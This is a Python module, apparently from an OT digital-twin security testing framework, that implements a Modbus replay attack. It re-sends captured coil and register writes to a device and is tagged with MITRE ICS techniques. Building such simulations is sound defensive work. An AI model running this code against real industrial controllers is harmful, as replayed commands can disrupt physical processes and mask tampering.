"""
Replay Attack — Captures and replays previously recorded Modbus write transactions.

Simulates an attacker who sniffs legitimate traffic and replays it later
to manipulate the process or mask unauthorized changes.

MITRE ATT&CK for ICS:
  T0856 — Spoof Reporting Message
  T0830 — Man in the Middle
"""

from __future__ import annotations

import asyncio
import json
import logging

from ot_twin.attacks.base import BaseAttack
from ot_twin.environment.historian import Historian
from ot_twin.models import AttackResult, ModbusTransaction, RegisterType

logger = logging.getLogger(__name__)


class ReplayAttack(BaseAttack):
    """Replay previously captured Modbus write transactions."""

    name = "replay"
    description = "Replay captured Modbus writes to spoof or repeat prior commands"
    mitre_techniques = ["T0856", "T0830"]

    def __init__(
        self,
        *args,
        source_historian: Historian | None = None,
        replay_limit: int = 20,
        replay_delay: float = 0.2,
        writes_only: bool = True,
        **kwargs,
    ) -> None:
        """
        Args:
            source_historian: Historian to pull captured transactions from.
                              If None, uses the attack's own historian.
            replay_limit: Max number of transactions to replay.
            replay_delay: Seconds between each replayed transaction.
            writes_only: Only replay write operations (default True).
        """
        super().__init__(*args, **kwargs)
        self.source_historian = source_historian or self.historian
        self.replay_limit = replay_limit
        self.replay_delay = replay_delay
        self.writes_only = writes_only

    def _load_transactions(self) -> list[dict]:
        """Pull transactions from the historian to replay."""
        if not self.source_historian:
            return []

        txs = self.source_historian.get_recent_transactions(self.replay_limit * 5)

        if self.writes_only:
            txs = [t for t in txs if t.get("is_write")]

        # Oldest first for natural replay order
        txs.reverse()
        return txs[: self.replay_limit]

    async def execute(self) -> AttackResult:
        captured = self._load_transactions()

        if not captured:
            return AttackResult(
                attack_name=self.name,
                success=False,
                details="No transactions available to replay",
            )

        success_count = 0
        affected: list[int] = []
        values_after: dict[int, int] = {}

        for tx in captured:
            fc = tx.get("function_code", 0)
            addr = tx.get("address", 0)
            values_json = tx.get("values_json", "[]")

            try:
                values = json.loads(values_json) if isinstance(values_json, str) else values_json
            except (json.JSONDecodeError, TypeError):
                values = []

            replayed = False

            if fc == 6 and values:
                # Write single holding register
                result = await self.client.write_register(
                    address=addr, value=values[0], device_id=self.unit_id,
                )
                replayed = not result.isError()

            elif fc == 16 and values:
                # Write multiple holding registers
                result = await self.client.write_registers(
                    address=addr, values=values, device_id=self.unit_id,
                )
                replayed = not result.isError()

            elif fc == 5 and values:
                # Write single coil
                result = await self.client.write_coil(
                    address=addr, value=bool(values[0]), device_id=self.unit_id,
                )
                replayed = not result.isError()

            elif fc == 15 and values:
                # Write multiple coils
                result = await self.client.write_coils(
                    address=addr, values=[bool(v) for v in values],
                    device_id=self.unit_id,
                )
                replayed = not result.isError()

            if replayed:
                success_count += 1
                affected.append(addr)
                if values:
                    values_after[addr] = values[0]
                logger.info(
                    "[%s] Replayed FC%d addr=%d values=%s",
                    self.name, fc, addr, values,
                )

            reg_type = RegisterType.COIL if fc in (5, 15) else RegisterType.HOLDING
            self._log_transaction(ModbusTransaction(
                function_code=fc,
                register_type=reg_type,
                address=addr,
                values=values if values else [],
                is_write=True,
            ))

            await asyncio.sleep(self.replay_delay)

        details = f"Replayed {success_count}/{len(captured)} captured transactions"
        logger.info("[%s] %s", self.name, details)

        return AttackResult(
            attack_name=self.name,
            success=success_count > 0,
            details=details,
            registers_affected=affected,
            values_after=values_after,
        )
